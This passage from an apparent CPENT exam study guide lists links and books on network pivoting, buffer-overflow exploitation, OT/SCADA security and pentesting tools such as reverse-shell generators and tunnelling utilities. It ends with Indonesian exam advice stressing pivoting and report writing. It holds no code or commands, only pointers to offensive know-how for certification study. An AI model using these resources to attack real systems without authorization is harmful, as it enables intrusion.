| 39 | System Weakness — All about Pivoting | https://systemweakness.com/everything-about-pivoting-oscp-active-directory-lateral-movement-6ed34faa08a2 |
| 40 | Dev.to — Pivoting & Tunneling 2026 | https://dev.to/lucky_lonerusher/pivoting-tunneling-2026-chisel-ligolo-ng-ssh-tunnels-socks5-through-victims-hacking-151m |
| 41 | PayloadsAllTheThings — Pivoting | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md |

### Binary Exploitation

| # | Resource | URL |
|---|----------|-----|
| 42 | Corelan Security (Tutorials) | https://www.corelan.be/ |
| 43 | FuzzySecurity — Exploit Tutorials | http://www.fuzzysecurity.com/tutorials.html |
| 44 | RGROSEC — x86 BOF Pt.1 & Pt.2 | https://www.rgrosec.com/ |
| 45 | Steflan — Complete BOF Guide | https://steflan-security.com/complete-guide-to-stack-buffer-overflow-oscp/ |
| 46 | Coalfire — x86-64 BOF | https://coalfire.com/the-coalfire-blog/the-basics-of-exploit-development-5-x86-64-buffer |
| 47 | dostackbufferoverflowgood | https://github.com/justinsteven/dostackbufferoverflowgood |
| 48 | GrayHat — BOF x86 vs x64 | https://www.grayhat.com/blog/buffer-overflow-x86-vs-x64/ |

### OT/SCADA & IoT

| # | Resource | URL |
|---|----------|-----|
| 49 | NIST SP 800-82 (Guide to ICS Security) | https://csrc.nist.gov/pubs/sp/800/82/r3/final |
| 50 | Dragos — ICS/OT Threat Intelligence | https://www.dragos.com/threat-intelligence/ |
| 51 | SANS ICS Security Resources | https://www.sans.org/ics-security/ |
| 52 | HackTricks — OT Security | https://book.hacktricks.xyz/network-services-pentesting/pentesting-ot |
| 53 | Modbus Protocol Spec | https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf |

### General Pentesting Resources

| # | Resource | URL |
|---|----------|-----|
| 54 | HackTricks | https://book.hacktricks.xyz |
| 55 | PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| 56 | GTFOBins | https://gtfobins.github.io |
| 57 | LOLBAS | https://lolbas-project.github.io |
| 58 | RevShells.com | https://www.revshells.com |
| 59 | Orange Cyberdefense Mindmaps | https://orange-cyberdefense.github.io/ocd-mindmaps/ |
| 60 | Impacket Suite | https://github.com/fortra/impacket |
| 61 | BloodHound | https://github.com/BloodHoundAD/BloodHound |
| 62 | Certipy | https://github.com/ly4k/Certipy |
| 63 | NetExec | https://github.com/Pennyw0rth/NetExec |
| 64 | Ligolo-ng | https://github.com/nicocha30/ligolo-ng |
| 65 | Chisel | https://github.com/jpillora/chisel |
| 66 | SecLists | https://github.com/danielmiessler/SecLists |
| 67 | linux-exploit-suggester | https://github.com/mzet-/linux-exploit-suggester |
| 68 | Windows Exploit Suggester | https://github.com/AonCyberLabs/Windows-Exploit-Suggester |

### Books

| # | Book | Author |
|---|------|--------|
| 69 | The Web Application Hacker's Handbook (2nd Ed.) | Stuttard & Pinto |
| 70 | Penetration Testing: A Hands-On Introduction | Georgia Weidman |
| 71 | The Hacker Playbook 3 | Peter Kim |
| 72 | Red Team Field Manual v2 | Ben Clark & Nick Downer |
| 73 | Hacking: The Art of Exploitation (2nd Ed.) | Jon Erickson |
| 74 | Practical Binary Analysis | Dennis Andriesse |
| 75 | Industrial Network Security (2nd Ed.) | Knapp & Langill |
| 76 | Applied Cyber Security and the Smart Grid | Eric Knapp |
| 77 | Black Hat Python (2nd Ed.) | Justin Seitz & Tim Arnold |

---

> **Catatan Akhir**: CPENT bukan tes seberapa banyak tools yang Anda kuasai — ini tes seberapa dalam Anda bisa menembus network. Fokus pada pivoting, binary exploitation 64-bit, dan report writing. Jika Anda bisa compromise 5 machines tapi report tidak lengkap, nilai Anda akan turun drastis. Jika Anda bisa 3 machines dengan report sempurna, Anda bisa lulus. Prioritaskan dokumentasi selama exam — report adalah pembeda antara CPENT dan LPT Master.
